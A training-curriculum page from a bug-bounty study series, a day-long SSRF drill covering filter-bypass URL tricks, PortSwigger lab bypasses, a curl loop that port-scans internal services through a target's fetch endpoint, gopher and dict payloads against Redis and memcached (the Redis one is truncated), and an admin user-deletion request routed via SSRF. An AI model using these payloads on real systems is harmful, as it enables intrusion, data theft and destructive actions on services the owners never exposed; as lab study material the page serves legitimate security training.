---
title: "Weak Area Reinforcement Day 4 — SSRF Depth Drill"
tags: [reinforcement, SSRF, cloud, internal-services, filter-bypass, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 319
related_topics:
  - Weak Area Reinforcement Day 3 (Day 318)
  - SSRF (Day 134)
  - HTB Cloud Series Day 2 (Day 307)
---

# Day 319 — Weak Area Reinforcement Day 4: SSRF Depth Drill

---

## Goals

Drill SSRF beyond the basic 127.0.0.1 test.
Cover filter bypass techniques, internal service enumeration, and
cloud metadata extraction via SSRF.

**Time budget:** 3 hours.

---

## Part 1 — SSRF Filter Bypass Techniques

### Recon: Why Filters Exist and How They Fail

```
Applications block SSRF by filtering the URL before making the request.
Common filter strategies and their weaknesses:

1. Block "127.0.0.1" (string match)
   Bypass: http://2130706433/  (decimal IP of 127.0.0.1)
           http://0x7f000001/  (hex IP)
           http://127.1/       (short form)
           http://[::1]/       (IPv6 loopback)
           http://localhost/   (DNS resolves to 127.0.0.1)

2. Block "169.254.169.254" (AWS metadata)
   Bypass: http://169.254.169.254.nip.io/
           http://metadata.google.internal/  (GCP)
           http://[::ffff:169.254.169.254]/  (IPv6 representation)
           DNS rebinding: register attacker.com → 169.254.169.254

3. Block "localhost" and "127.x.x.x" (strict)
   Bypass: Double URL encoding: http://%31%32%37%2e%30%2e%30%2e%31/
           URL with credentials: http://attacker@127.0.0.1/
           Open redirect chain: http://TARGET/redirect?url=http://127.0.0.1/

4. Allowlist (only specific domains)
   Bypass: Use open redirect on allowed domain:
           http://ALLOWED_DOMAIN/redirect?to=http://127.0.0.1/
           Or subdomains: http://evil.ALLOWED_DOMAIN/  (if wildcard)

5. Scheme filter (block http://)
   Bypass: file:///etc/passwd (if file scheme not blocked)
           dict://127.0.0.1:11211/ (memcached)
           gopher://127.0.0.1:6379/ (Redis)
```

### Exploit Lab

```bash
# PortSwigger: "SSRF with blacklist-based input filter"
# Filter blocks "127.0.0.1" and "localhost"

# Test bypasses:
# http://127.1/admin
# http://2130706433/admin
# http://0x7f000001/admin

# PortSwigger: "SSRF with whitelist-based input filter"
# Only allows stockapi.TARGET.com

# Bypass: use URL parsing confusion
# http://expected.TARGET.com@192.168.0.68/admin
# http://192.168.0.68#expected.TARGET.com
# http://localhost:80%2523@stock.TARGET.com/admin  (double encoding)
```

```
Filter type on lab: ___
Bypass used: ___
Lab completed: Y/N
```

---

## Part 2 — Internal Service Enumeration

### Port Scanning via SSRF

```bash
# Use SSRF to port-scan internal network
# Time-based: slow response = port open, fast error = port closed

# Common internal ports to probe:
PORTS=(22 80 443 3306 5432 6379 8080 8443 9200 27017)

for PORT in "${PORTS[@]}"; do
  echo -n "Port $PORT: "
  curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
    "https://TARGET/fetch?url=http://127.0.0.1:$PORT/" \
    --max-time 5
done
```

### Accessing Internal Services

```bash
# Redis (port 6379) via SSRF with Gopher protocol
# Gopher allows sending raw TCP data through SSRF
# Command: SET key value, then write a web shell

# Gopher URL format: gopher://127.0.0.1:6379/_COMMAND
# URL-encoded Redis command sequence to write a cron job
# (if Redis runs as root)

GOPHER_CMD="gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."
curl "https://TARGET/fetch?url=$GOPHER_CMD"

# Memcached via SSRF (dict:// scheme)
curl "https://TARGET/fetch?url=dict://127.0.0.1:11211/stats"

# Elasticsearch (port 9200) — no auth by default on old versions
curl "https://TARGET/fetch?url=http://127.0.0.1:9200/_cat/indices"
curl "https://TARGET/fetch?url=http://127.0.0.1:9200/INDEX/_search?size=100"
```

```
Internal services discovered: ___
Interesting service: ___
Data accessed: ___
```

---

## Part 3 — SSRF to Full CSRF / Impact Escalation

### Using SSRF to Access Admin Interfaces

```bash
# Admin panel on 127.0.0.1 only (common pattern)
curl "https://TARGET/fetch?url=http://127.0.0.1/admin"

# If admin panel returned — automate admin actions via SSRF
# e.g. delete user via SSRF:
curl "https://TARGET/fetch?url=http://127.0.0.1/admin/deleteUser?username=victim"

# If the app passes auth cookies to internal requests (common misconfiguration)
# → Admin action executed as the application service account
```

```
Admin access via SSRF: Y/N
Actions performed: ___
Impact demonstrated: ___
```

---

## Post-Drill Rating

```
Area                              | Before | After
----------------------------------|--------|-------
SSRF — reflected                  |   /5   |  /5
SSRF — blind / OOB                |   /5   |  /5
SSRF — filter bypass              |   /5   |  /5
SSRF — cloud metadata             |   /5   |  /5
SSRF — internal service access    |   /5   |  /5

New bypass technique I did not know before today:
  ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q319.1, Q319.2 …).

---

## Navigation

← Previous: [Day 318 — Weak Area Reinforcement Day 3](DAY-0318-Weak-Area-Reinforcement-Day-03.md)
→ Next: [Day 320 — Weak Area Reinforcement Day 5](DAY-0320-Weak-Area-Reinforcement-Day-05.md)
